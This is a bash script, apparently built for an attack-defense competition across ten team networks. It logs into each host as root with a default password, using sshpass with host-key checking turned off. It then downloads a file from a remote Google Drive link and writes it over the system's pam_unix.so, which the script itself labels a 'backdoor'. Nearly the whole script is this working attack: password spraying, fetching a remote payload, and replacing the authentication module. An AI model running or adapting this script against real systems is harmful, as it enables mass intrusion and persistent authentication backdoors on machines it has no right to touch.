#!/bin/bash

IPs=()
network_id="10.20"
number_of_teams=10
host_ids=(111 121 131)
username="root"
default_password="Password1!"
timeout_duration=3
path_to_pam="/lib/x86_64-linux-gnu/security"
backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"

install_curl() {
    # Check the distribution and install curl accordingly
    if [ -f /etc/debian_version ]; then
        # Debian/Ubuntu-based systems
        echo "$default_password" | sudo -S apt update && sudo -S apt install curl -y || { echo "Failed to install curl"; exit 1; }
    elif [ -f /etc/redhat-release ]; then
        # CentOS/RHEL 7 and older (uses yum)
        if [ -f /etc/centos-release ] || [ -f /etc/redhat-release ]; then
            echo "$default_password" | sudo -S yum install curl -y || { echo "Failed to install curl"; exit 1; }
        # CentOS/RHEL 8+ (uses dnf)
        elif [ -f /etc/os-release ] && grep -qi "centos\|rhel" /etc/os-release; then
            echo "$default_password" | sudo -S dnf install curl -y || { echo "Failed to install curl"; exit 1; }
        fi
    elif [ -f /etc/os-release ] && grep -qi "opensuse" /etc/os-release; then
        # openSUSE (uses zypper)
        echo "$default_password" | sudo -S zypper install curl -y || { echo "Failed to install curl"; exit 1; }
    elif [ -f /etc/os-release ] && grep -qi "arch" /etc/os-release; then
        # Arch Linux (uses pacman)
        echo "$default_password" | sudo -S pacman -Syu curl --noconfirm || { echo "Failed to install curl"; exit 1; }
    else
        echo "Unsupported distribution."
        exit 1
    fi
}

main() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done
    
    export default_password timeout_duration username path_to_pam backdoor_link

    printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
        IP="{}"
        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
            # Install curl based on the distribution
            install_curl
            echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\" || { echo \"Failed to download backdoor on $IP\"; exit 1; }
        "
    '
}

main
